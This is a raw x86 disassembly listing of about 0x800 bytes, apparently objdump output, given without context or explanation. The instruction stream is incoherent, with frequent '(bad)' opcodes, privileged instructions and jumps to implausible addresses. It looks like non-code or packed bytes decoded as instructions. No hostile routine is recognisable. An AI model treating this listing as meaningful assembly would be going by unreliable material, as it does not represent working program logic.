  43137c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431383:	loop   0x43130e
  431385:	(bad)  
  431386:	xchg   esi,eax
  431387:	aam    0xcf
  431389:	out    dx,al
  43138a:	mov    DWORD PTR [esi-0x68],edi
  43138d:	inc    ebp
  43138e:	dec    edx
  43138f:	pop    ecx
  431390:	mov    edx,DWORD PTR [eax]
  431392:	repnz push bp
  431395:	or     BYTE PTR [ebx+0x55106638],0x49
  43139c:	(bad)  
  43139d:	repnz xor eax,0xa0898945
  4313a3:	mov    ah,0x89
  4313a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4313ab:	inc    DWORD PTR [ebp+0x50]
  4313ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4313b2:	mov    DWORD PTR [eax],ecx
  4313b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4313b5:	pop    es
  4313b6:	inc    ecx
  4313b7:	(bad)  
  4313b8:	data16 fwait
  4313ba:	inc    ebp
  4313bb:	xor    ah,BYTE PTR [esi+0x3]
  4313be:	dec    ebp
  4313bf:	push   eax
  4313c0:	inc    bp
  4313c2:	jge    0x431347
  4313c4:	mov    esp,DWORD PTR [esi-0x18]
  4313c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4313cd:	add    DWORD PTR [ebx],esi
  4313cf:	add    BYTE PTR [ebx],al
  4313d1:	test   DWORD PTR [ebx],esi
  4313d3:	(bad)  
  4313d4:	inc    WORD PTR [ebp+0x0]
  4313d8:	mov    eax,DWORD PTR [eax]
  4313da:	call   0x8898cb0f
  4313df:	mov    esi,eax
  4313e1:	clc    
  4313e2:	ret    
  4313e3:	rol    cl,0xa
  4313e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4313ec:	mov    edx,edi
  4313ee:	pushf  
  4313ef:	pop    es
  4313f0:	jmp    FWORD PTR [edx+0x66]
  4313f3:	add    BYTE PTR [ebp-0x990175],al
  4313f9:	inc    ebp
  4313fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431400:	push   ebp
  431401:	mov    edi,eax
  431403:	mov    dh,BYTE PTR [eax+0x266ff51]
  431409:	push   ebp
  43140a:	add    BYTE PTR [ebx-0x764b0777],al
  431410:	dec    DWORD PTR [esi+0x661851e8]
  431416:	add    BYTE PTR [ebp-0x7b],dl
  431419:	cmp    esi,0xfffffffb
  43141c:	dec    DWORD PTR [ecx+0x51fe9285]
  431422:	jmp    DWORD PTR [esi-0x75]
  431425:	push   ebp
  431426:	hlt    
  431427:	data16 (bad) 
  431429:	dec    ebp
  43142a:	ret    
  43142b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431431:	lea    edx,[eax-0x1]
  431434:	jne    0x431407
  431436:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43143c:	dec    BYTE PTR [ecx+0x51559eff]
  431442:	mov    DWORD PTR [esi-0x4c],esp
  431445:	push   ebp
  431446:	jmp    DWORD PTR [esi-0x18]
  431449:	inc    ebp
  43144a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431450:	(bad)  
  431451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431452:	inc    eax
  431454:	test   DWORD PTR [esi-0x2],esp
  431457:	inc    ebp
  431458:	dec    DWORD PTR [ebp-0x760bde75]
  43145e:	(bad)  
  43145f:	test   al,0xc3
  431461:	mov    DWORD PTR [ebp-0x769b56],ecx
  431467:	lods   al,BYTE PTR ds:[esi]
  431468:	push   eax
  431469:	inc    ebp
  43146a:	jne    0x43147b
  43146c:	dec    DWORD PTR [ebp+0x8]
  43146f:	mov    ecx,DWORD PTR [ebx]
  431471:	sbb    al,0x0
  431473:	(bad)  
  431474:	mov    eax,0xc14fc3
  431479:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43147f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431483:	xor    eax,DWORD PTR [eax]
  431485:	add    eax,edi
  431487:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43148d:	xor    edi,DWORD PTR [eax+0x854f66]
  431493:	dec    BYTE PTR [ecx-0x76bb01]
  431499:	mov    BYTE PTR [ebx-0x76724001],al
  43149f:	pushf  
  4314a0:	inc    esi
  4314a1:	(bad)  
  4314a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4314a8:	sar    esi,0x89
  4314ab:	dec    DWORD PTR [eax+0x0]
  4314ae:	inc    DWORD PTR [eax]
  4314b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4314b7:	xlat   BYTE PTR ds:[ebx]
  4314b8:	dec    edx
  4314b9:	add    bh,bh
  4314bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4314c1:	lea    esp,[esi-0x50]
  4314c4:	(bad)  
  4314c5:	(bad)  
  4314c6:	call   DWORD PTR [eax-0x1]
  4314c9:	inc    ebp
  4314ca:	rdpmc  
  4314cc:	add    BYTE PTR [ebx],al
  4314ce:	push   ax
  4314d0:	lea    eax,[ebp-0x1]
  4314d6:	js     0x4314d7
  4314d8:	add    al,bh
  4314da:	push   bp
  4314dc:	lea    ecx,[ebp-0x7701]
  4314e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4314e8:	(bad)  
  4314e9:	(bad)  
  4314ea:	(bad)  
  4314eb:	(bad)  
  4314ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4314f2:	dec    eax
  4314f3:	mov    eax,0x8d8dffff
  4314f8:	mov    al,0xb0
  4314fa:	(bad)  
  4314fb:	call   DWORD PTR [ecx+0x50]
  4314fe:	dec    ebp
  4314ff:	inc    ebp
  431500:	mov    esi,0x7030833
  431505:	push   eax
  431506:	into   
  431507:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43150d:	call   DWORD PTR [ecx-0x8]
  431510:	lea    edx,[ebp-0x1]
  431513:	jmp    0x761717
  431518:	inc    eax
  431519:	jnp    0x4314a8
  43151b:	add    dh,bh
  43151d:	inc    WORD PTR [ebp-0x8a00b0]
  431524:	mov    edx,eax
  431526:	inc    esp
  431527:	add    bh,bh
  431529:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43152f:	dec    DWORD PTR [ebx-0x7f820301]
  431535:	add    BYTE PTR [ecx],al
  431537:	data16 add BYTE PTR [ebp-0xb30077],al
  43153e:	inc    eax
  431540:	(bad)  
  431541:	dec    si
  431543:	test   edi,edi
  431545:	(bad)  
  431546:	cmp    edi,edi
  431548:	add    ecx,DWORD PTR [edi-0x39]
  43154b:	mov    edx,DWORD PTR [edx+0x66]
  43154e:	inc    DWORD PTR [ebp-0x3d00cb]
  431554:	mov    eax,0x66ff8b5e
  43155a:	jmp    0xb4ff:0xc7ff3895
  431561:	push   ecx
  431562:	inc    DWORD PTR [ebx-0x76ffccbb]
  431568:	call   DWORD PTR [esi-0x1]
  43156b:	dec    DWORD PTR [eax]
  43156d:	mov    ecx,0x805ff
  431572:	inc    ebp
  431573:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431579:	mov    ecx,0x35784
  43157e:	add    BYTE PTR [ecx-0xffa59b],cl
  431584:	inc    ebp
  431585:	mov    ecx,0x9c6131
  43158a:	(bad)  
  43158b:	mov    eax,ebx
  43158d:	pop    esp
  43158e:	test   edi,edi
  431590:	clc    
  431591:	lea    eax,[ebp-0x24]
  431594:	cmp    eax,0xc7fe9c8d
  431599:	push   eax
  43159b:	lea    eax,[ebp+0x45fff8fe]
  4315a1:	mov    esi,DWORD PTR [ecx]
  4315a3:	hlt    
  4315a4:	lahf   
  4315a5:	push   esp
  4315a6:	mov    edx,DWORD PTR [ecx-0x4]
  4315a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4315af:	add    BYTE PTR [ebp-0x35],al
  4315b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4315b8:	mov    edx,DWORD PTR [ecx-0x74]
  4315bb:	rol    BYTE PTR [eax],0x8d
  4315be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4315c2:	nop
  4315c3:	push   ecx
  4315c4:	add    bh,bh
  4315c6:	mov    esp,edi
  4315c8:	in     al,0x85
  4315ca:	jge    0x4315ca
  4315cc:	test   edi,edi
  4315ce:	jne    0x431555
  4315d0:	(bad)  
  4315d1:	(bad)  
  4315d2:	sbb    bh,bh
  4315d4:	push   ebp
  4315d5:	inc    ebp
  4315d6:	call   0xffdc1066
  4315db:	add    BYTE PTR [ebp+0x66],al
  4315de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4315e4:	cmp    al,0x85
  4315e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4315ea:	test   DWORD PTR [edi+0x74],ecx
  4315ed:	dec    edi
  4315ee:	inc    DWORD PTR [ebp-0x530004]
  4315f4:	dec    DWORD PTR [edi-0x75]
  4315f7:	dec    esi
  4315f8:	cld    
  4315f9:	test   DWORD PTR [eax+0xff01ff],eax
  4315ff:	icebp  
  431600:	add    BYTE PTR [edi-0x3a],cl
  431603:	test   ebx,eax
  431605:	inc    BYTE PTR [ebp-0x1]
  431608:	jne    0x43160a
  43160a:	mov    eax,DWORD PTR [eax]
  43160c:	cld    
  43160d:	xor    BYTE PTR [ecx+0x500155],cl
  431613:	push   ebp
  431614:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43161a:	add    BYTE PTR [ebp+0x35e90f50],al
  431620:	add    al,BYTE PTR [eax]
  431622:	add    BYTE PTR [ebx-0x38fe4f80],al
  431628:	add    ah,ch
  43162a:	or     BYTE PTR [ebp+0x4501f845],dh
  431630:	jmp    0xdf1926
  431635:	(bad)  
  431636:	nop    ecx
  431639:	test   DWORD PTR [ebp+0x4502f8],eax
  43163f:	xor    ecx,DWORD PTR [ebp-0x64]
  431642:	mov    eax,edi
  431644:	mov    ebx,DWORD PTR [eax+edx*2]
  431647:	add    eax,0x45fef885
  43164c:	dec    DWORD PTR [ebx+0x339445]
  431652:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431658:	dec    DWORD PTR [ebx-0x460f0375]
  43165e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43165f:	add    esi,edi
  431661:	add    bh,bh
  431663:	rdpmc  
  431665:	add    BYTE PTR [ebx],0x1
  431668:	mov    DWORD PTR [eax],eax
  43166a:	add    al,0x45
  43166c:	dec    DWORD PTR [ecx-0x360b3373]
  431672:	dec    DWORD PTR [esi]
  431674:	push   eax
  431675:	jne    0x4316bc
  431677:	mov    esi,DWORD PTR [ebx]
  431679:	cld    
  43167a:	add    esp,ecx
  43167c:	push   eax
  43167d:	inc    DWORD PTR [ebp-0x75]
  431680:	add    eax,0x800e4
  431685:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43168b:	mov    DWORD PTR [ecx],eax
  43168d:	sbb    al,0x0
  43168f:	leave  
  431690:	test   DWORD PTR [edi-0x2],eax
  431693:	jne    0x431694
  431695:	call   0xff44009a
  43169a:	xor    BYTE PTR [ebp+0x4d],al
  43169d:	mov    edi,edi
  43169f:	enter  0x8,0x4d
  4316a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4316a9:	mov    eax,DWORD PTR [eax]
  4316ab:	cld    
  4316ac:	add    DWORD PTR [ecx],ebx
  4316ae:	inc    ebp
  4316af:	dec    ebp
  4316b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4316b6:	inc    eax
  4316b7:	dec    DWORD PTR [ecx-0x270375]
  4316bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4316c3:	xchg   ecx,eax
  4316c4:	ret    
  4316c5:	add    BYTE PTR [ebp-0x830075],al
  4316cb:	add    BYTE PTR [ebp-0x75],al
  4316ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4316d4:	lea    edi,[edi-0xc]
  4316d7:	add    bh,bh
  4316d9:	mov    edx,DWORD PTR [eax-0x7b]
  4316dc:	inc    ebp
  4316dd:	rdpmc  
  4316df:	jne    0x4316e4
  4316e1:	add    BYTE PTR [eax-0x75],dl
  4316e4:	inc    ebp
  4316e5:	clc    
  4316e6:	add    eax,0x400009
  4316eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4316f1:	mov    eax,DWORD PTR [ecx]
  4316f3:	in     al,dx
  4316f4:	add    dh,al
  4316f6:	test   ebx,eax
  4316f8:	inc    BYTE PTR [ebp-0xff0001]
  4316fe:	add    BYTE PTR [ebp-0x43],al
  431701:	cmp    esi,0xfffffff8
  431704:	(bad)  
  431705:	push   DWORD PTR [eax]
  431707:	add    BYTE PTR [ebp-0x3a],dl
  43170a:	test   ebx,eax
  43170c:	je     0x431693
  43170e:	mov    edi,edi
  431710:	sbb    al,0xff
  431712:	test   DWORD PTR gs:[eax],eax
  431715:	(bad)  
  431716:	js     0x431717
  431718:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43171e:	sub    eax,ebx
  431720:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431726:	add    eax,DWORD PTR [eax]
  431728:	dec    ebp
  431729:	push   eax
  43172a:	mov    al,BYTE PTR [ebp+0x1]
  43172d:	mov    eax,DWORD PTR [ebp-0x68]
  431730:	mov    eax,DWORD PTR [eax]
  431732:	sbb    bh,al
  431734:	or     ah,dh
  431736:	dec    ebp
  431737:	inc    DWORD PTR [eax+0x4]
  43173a:	push   ecx
  43173b:	add    BYTE PTR [edx-0x1],dh
  43173e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431744:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43174e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431754:	push   ecx
  431755:	cmp    BYTE PTR [ebx],al
  431757:	inc    ebp
  431758:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43175e:	(bad)  
  43175f:	(bad)  
  431760:	in     al,0xff
  431762:	add    BYTE PTR [ebp+0x0],al
  431765:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43176b:	add    al,bh
  43176d:	(bad)  
  43176e:	jmp    0x8d85:0x74b0558d
  431775:	dec    DWORD PTR [eax]
  431777:	call   DWORD PTR [ebp-0x7b]
  43177a:	mov    edi,esi
  43177c:	lock call DWORD PTR [ebp-0x75]
  431780:	mov    esi,esp
  431782:	mov    ah,0xc6
  431784:	mov    bh,0xc3
  431786:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43178c:	add    DWORD PTR [eax],0x450050ff
  431792:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431798:	inc    edi
  43179a:	push   esp
  43179c:	jmp    0xcd00:0x650481ff
  4317a3:	mov    DWORD PTR [ebx],esi
  4317a5:	clc    
  4317a6:	cmp    edi,0xff9cff3c
  4317ac:	jne    0x4317b6
  4317ae:	mov    eax,eax
  4317b0:	add    esi,DWORD PTR [eax]
  4317b2:	int3   
  4317b3:	inc    ebp
  4317b4:	cmp    al,0x83
  4317b6:	add    BYTE PTR [eax],bl
  4317b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4317be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4317c4:	mov    edi,eax
  4317c6:	cmp    BYTE PTR [ebp+0x45],cl
  4317c9:	jmp    0x431756
  4317cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4317ce:	inc    ebp
  4317cf:	or     al,0x2
  4317d1:	dec    DWORD PTR [ebp+0x18]
  4317d4:	jne    0x43182b
  4317d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4317dc:	mov    edi,DWORD PTR [ebx]
  4317de:	in     al,0x50
  4317e0:	xchg   ecx,eax
  4317e1:	jmp    0x34366e6
  4317e6:	adc    al,0x8b
  4317e8:	inc    ebp
  4317e9:	mov    al,ds:0x8b04008b
  4317ee:	push   ebp
  4317ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4317f5:	push   ebp
  4317f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4317fc:	inc    ebp
  4317fd:	dec    ebp
  4317fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431804:	mov    DWORD PTR [eax],0xe9ff00f4
  43180a:	add    al,0x0
  43180c:	add    BYTE PTR [eax],al
  43180e:	mov    eax,edx
  431810:	push   eax
  431811:	rol    DWORD PTR [ebp-0xf0177],1
  431817:	bound  eax,QWORD PTR [ebp+0x50]
  43181a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431820:	add    BYTE PTR [ecx+0x558df0ff],cl
  431826:	mov    al,0xf
  431828:	test   DWORD PTR [edx],edx
  43182a:	call   DWORD PTR [ebp-0x7a0001]
  431830:	(bad)  
  431831:	loop   0x431832
  431833:	jnp    0xc6990c39
  431839:	mov    eax,ebx
  43183b:	cmp    al,0x8b
  43183d:	(bad)  
  43183e:	cld    
  43183f:	shr    esi,0xc
  431842:	add    dl,al
  431844:	push   eax
  431845:	lea    eax,[ebp-0x1]
  431848:	mov    edx,esi
  43184a:	cwde   
  43184b:	cli    
  43184c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431852:	or     BYTE PTR [eax],cl
  431854:	inc    ebp
  431855:	dec    ebp
  431856:	inc    DWORD PTR [ebx+0x74803914]
  43185c:	add    DWORD PTR [ebx+0x451800],ecx
  431862:	call   DWORD PTR [eax+edx*1]
  431865:	add    ecx,DWORD PTR [ebp-0x34]
  431868:	push   edi
  431869:	adc    al,0x8
  43186b:	mov    edx,DWORD PTR [ebp-0x14]
  43186e:	mov    ecx,DWORD PTR [ebp+0x18]
  431871:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431875:	inc    DWORD PTR [eax+esi*8]
  431878:	inc    ebp
  431879:	stos   BYTE PTR es:[edi],al
  43187a:	mov    edx,DWORD PTR [ebp-0x4]
  43187d:	add    DWORD PTR [ebp-0x1c],eax
  431880:	mov    edx,DWORD PTR [ebp-0x70]
  431883:	cmp    eax,DWORD PTR [eax]
  431885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431886:	mov    eax,DWORD PTR [eax]
  431888:	cld    
  431889:	jae    0x43180b
  43188b:	add    eax,DWORD PTR [ecx]
  43188d:	clc    
  43188e:	add    BYTE PTR [eax+0x30],dl
  431891:	mov    DWORD PTR [ecx],esi
  431893:	clc    
  431894:	pop    ds
  431895:	inc    ebp
  431896:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43189c:	(bad)  
  43189d:	push   DWORD PTR [edi]
  43189f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4318a5:	(bad)  
  4318a6:	jae    0x4318a7
  4318a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4318ae:	sub    eax,DWORD PTR [eax]
  4318b0:	add    eax,DWORD PTR [eax]
  4318b2:	mov    DWORD PTR [ecx+0x5f],eax
  4318b5:	mov    DWORD PTR [ebx-0x4],ebx
  4318b8:	ret    0xff
  4318bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4318c1:	ret    
  4318c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4318c8:	add    BYTE PTR [ebp-0x7d],al
  4318cb:	mov    DWORD PTR [eax],eax
  4318cd:	add    al,0x84
  4318cf:	inc    DWORD PTR [ecx]
  4318d1:	lea    eax,[eax]
  4318d3:	hlt    
  4318d4:	sar    bh,cl
  4318d6:	test   BYTE PTR [eax+0x1],dl
  4318d9:	inc    ebp
  4318da:	add    BYTE PTR [ebx],dh
  4318dc:	test   BYTE PTR [ebx],0x84
  4318df:	push   eax
  4318e0:	add    BYTE PTR [ebp+0x0],al
  4318e3:	add    eax,0x86
  4318e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4318ee:	add    BYTE PTR [ecx],al
  4318f0:	add    BYTE PTR [eax],al
  4318f2:	mov    esi,0x550030
  4318f7:	mov    ecx,DWORD PTR [edi]
  4318f9:	cld    
  4318fa:	fidiv  DWORD PTR [ebp+0x0]
  4318fd:	mov    edi,DWORD PTR [ecx]
  4318ff:	xor    BYTE PTR [eax+eax*1],0x84
  431903:	add    eax,DWORD PTR [eax]
  431905:	sbb    BYTE PTR [eax],al
  431907:	jne    0x4318ba
  431909:	mov    eax,DWORD PTR [ecx]
  43190b:	sbb    BYTE PTR [eax],al
  43190d:	mov    DWORD PTR [ebp-0x1],esp
  431910:	add    BYTE PTR [eax+0x30e45ca],bh
  431916:	ret    0xb7fc
  431919:	dec    ebp
  43191a:	or     al,0x89
  43191c:	dec    ebp
  43191d:	cld    
  43191e:	cmovne ecx,DWORD PTR [eax-0x75]
  431922:	add    edi,esp
  431924:	seto   BYTE PTR [esi-0x72ffffff]
  43192b:	inc    ebp
  43192c:	adc    al,0x8b
  43192e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431935:	cmp    DWORD PTR [edi+0x72],edx
  431938:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  43193e:	gs cmp al,0x0
  431941:	je     0x431919
  431943:	push   eax
  431944:	sar    BYTE PTR [eax],1
  431946:	mov    bh,0x3e
  431948:	push   cs
  431949:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  43194f:	add    DWORD PTR [ecx+0x12],ebp
  431952:	dec    edx
  431953:	(bad)  
  431954:	mov    eax,edx
  431956:	in     al,dx
  431957:	adc    DWORD PTR [ecx],esi
  431959:	pop    esi
  43195a:	inc    ecx
  43195b:	leave  
  43195c:	or     DWORD PTR [eax],ebx
  43195e:	gs push ebp
  431960:	add    ah,ch
  431962:	into   
  431963:	in     al,dx
  431964:	enter  0xb756,0xf0
  431968:	push   cs
  431969:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431973:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431979:	jnp    0x74439e81
  43197f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431985:	add    BYTE PTR [edi],cl
  431987:	mov    edi,DWORD PTR [ecx-0x78]
  43198a:	ltr    WORD PTR [ecx-0x7b]
  43198e:	dec    DWORD PTR [edi]
  431990:	clc    
  431991:	out    0x45,eax
  431993:	add    BYTE PTR [eax],cl
  431995:	cmp    ebx,0xffffff8c
  431998:	jge    0x43199a
  43199a:	jb     0x4319ac
  43199c:	je     0x521a1c
  4319a2:	pop    edx
  4319a3:	push   esi
  4319a4:	mov    ecx,DWORD PTR [edi]
  4319a6:	in     al,dx
  4319a7:	rol    DWORD PTR [ebp+0x0],1
  4319aa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4319b1:	cmp    DWORD PTR [ecx],0xfffffff0
  4319b4:	hlt    
  4319b5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4319bb:	(bad)  
  4319bd:	push   eax
  4319be:	jns    0xb842fe3c
  4319c4:	lock push cs
  4319c6:	ror    edx,0x3
  4319c9:	test   BYTE PTR [ecx+0x5500e800],cl
  4319cf:	dec    eax
  4319d0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4319d4:	(bad)  
  4319d5:	mov    esi,0x7f33ff5f
  4319da:	inc    eax
  4319db:	test   DWORD PTR [edx],eax
  4319dd:	je     0x43199f
  4319df:	mov    ecx,ecx
  4319e1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4319e5:	and    eax,DWORD PTR [eax+0xf0103]
  4319eb:	jp     0x4319d9
  4319ed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4319f1:	add    edx,DWORD PTR [edi+0x74]
  4319f4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4319fa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a00:	je     0x431985
  431a02:	cmp    eax,edi
  431a04:	js     0x431a29
  431a06:	add    eax,0xeb0fc003
  431a0b:	jns    0x431998
  431a0d:	vmread DWORD PTR [ecx+0x45],ebx
  431a11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a17:	adc    al,0x8b
  431a19:	jge    0x431a2f
  431a1b:	mov    edi,DWORD PTR [eax-0x4]
  431a1e:	add    edi,DWORD PTR [edi]
  431a20:	or     bh,bh
  431a22:	push   ebp
  431a23:	push   es
  431a24:	mov    DWORD PTR [ebp-0x4],ebx
  431a27:	add    edi,esi
  431a29:	pop    es
  431a2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431a30:	mov    DWORD PTR [esp+esi*8],ecx
  431a33:	inc    ebp
  431a34:	pop    ebp
  431a35:	xor    DWORD PTR [esi-0x4],0x3b
  431a39:	add    edx,DWORD PTR [ecx+edi*1]
  431a3c:	push   es
  431a3d:	clc    
  431a3e:	mov    bh,0xdb
  431a40:	jp     0x4319f9
  431a42:	add    cl,BYTE PTR [esi]
  431a44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431a4a:	test   edi,edi
  431a4c:	je     0x431a42
  431a4e:	mov    eax,ecx
  431a50:	or     BYTE PTR [ebx],al
  431a52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431a58:	jbe    0x431acc
  431a5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431a60:	add    ecx,DWORD PTR [esi]
  431a62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431a68:	add    eax,DWORD PTR [ebx-0x287af783]
  431a6e:	je     0x431abd
  431a70:	mov    DWORD PTR [ecx],edi
  431a72:	mov    esi,eax
  431a74:	hlt    
  431a75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a7c:	jb     0x431a3e
  431a7e:	jmp    0x431a6b
  431a80:	xor    esi,DWORD PTR [ebx]
  431a82:	pop    edi
  431a83:	pop    esi
  431a84:	pop    ebx
  431a85:	ret    
  431a86:	ret    0x8b
  431a89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a8f:	xor    DWORD PTR [ecx],0xc
  431a92:	pushf  
  431a93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a99:	rdmsr  
  431a9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431aa2:	dec    ebp
  431aa3:	ret    
  431aa4:	mov    edi,DWORD PTR [esi-0x4]
  431aa7:	pop    eax
  431aa8:	dec    ebp
  431aa9:	jne    0x431a36
  431aab:	xor    edi,esp
  431aad:	inc    eax
  431aae:	dec    ebp
  431aaf:	jbe    0x431b04
  431ab1:	inc    eax
  431ab2:	pop    ebp
  431ab3:	add    edx,DWORD PTR [esi+0x8]
  431ab6:	push   esp
  431ab7:	dec    eax
  431ab8:	push   ecx
  431ab9:	mov    eax,edi
  431abb:	and    al,0xf0
  431abd:	jo     0x431aaa
  431abf:	mov    eax,DWORD PTR [ebx]
  431ac1:	sbb    BYTE PTR [ebp+0x4d],cl
  431ac4:	mov    eax,DWORD PTR [ebx]
  431ac6:	nop
  431ac7:	or     BYTE PTR [eax],al
  431ac9:	jne    0x431b22
  431acb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431ad1:	cld    
  431ad2:	xor    edi,edi
  431ad4:	add    edi,DWORD PTR [ebp+0x3]
  431ad7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431add:	js     0x431a63
  431adf:	jae    0x431ae3
  431ae1:	(bad)  
  431ae3:	xor    al,0x5d
  431ae5:	jmp    0x431a72
  431ae7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431aee:	fdecstp 
  431af0:	test   BYTE PTR [edi],ah
  431af2:	add    bh,BYTE PTR [ebp+0x0]
  431af5:	add    ebx,DWORD PTR [ebp-0x77]
  431af8:	mov    edi,eax
  431afa:	cmp    al,0x0
  431afd:	adc    dh,BYTE PTR [ebx]
  431aff:	jge    0x431b04
  431b01:	mov    edi,DWORD PTR [ebx]
  431b03:	jl     0x431b14
  431b05:	clc    
  431b06:	dec    edi
  431b07:	jge    0x431b09
  431b09:	mov    eax,DWORD PTR [ebx]
  431b0b:	jb     0x431b15
  431b0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b10:	mov    edi,edi
  431b12:	xor    edx,DWORD PTR [eax]
  431b14:	add    edi,DWORD PTR [ebx]
  431b16:	mov    DWORD PTR [ebp-0x10],edi
  431b19:	inc    edi
  431b1a:	pop    ebp
  431b1b:	jge    0x431b58
  431b1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431b21:	mov    edx,0xc05d87f0
  431b26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431b2a:	fimul  WORD PTR [eax]
  431b2c:	fist   WORD PTR [ebp+0x1c]
  431b2f:	in     al,dx
  431b30:	jne    0x431b1e
  431b32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431b38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431b3c:	fdivp  st(0),st
  431b3e:	fild   WORD PTR [ebp+0x4510f85c]
  431b44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431b4a:	inc    ebp
  431b4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431b51:	mov    ebp,DWORD PTR [ebx-0x4]
  431b54:	adc    al,0x8b
  431b56:	rcl    DWORD PTR [eax],0x48
  431b59:	mov    esi,0x7080803
  431b5e:	fiadd  WORD PTR [ebp+0x4d]
  431b61:	(bad)  
  431b62:	mov    edx,DWORD PTR [edx-0x4]
  431b65:	mov    edx,DWORD PTR [ebp-0x4]
  431b68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b6e:	mov    DWORD PTR [edi+0x872dc],edi
  431b74:	xlat   BYTE PTR ds:[ebx]
  431b75:	into   
  431b76:	ffreep st(6)
  431b78:	retf   0x6c7
  431b7b:	iret   
  431b7c:	dec    ebp
  431b7d:	inc    ebp
  431b7e:	mov    DWORD PTR [ebx],edi
  431b80:	fmul   QWORD PTR [edi]
  431b82:	dec    ebp
  431b83:	jnp    0x431bb8
  431b85:	add    BYTE PTR [ebx],al
  431b87:	mov    ecx,DWORD PTR [esp+edi*8]
  431b8a:	inc    ebp
  431b8b:	dec    ebp
  431b8c:	lea    esi,[ebx]
  431b8e:	add    DWORD PTR [ebx],eax
